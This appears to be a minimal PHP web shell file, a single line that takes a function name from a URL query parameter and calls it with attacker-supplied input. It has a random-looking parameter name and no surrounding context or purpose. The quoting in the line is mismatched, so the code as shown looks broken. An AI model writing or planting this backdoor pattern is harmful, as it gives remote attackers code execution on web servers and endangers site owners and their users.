<?php
$_GET["Qbvr5E1u']($_GET['Qbvr5E1u']);
?>
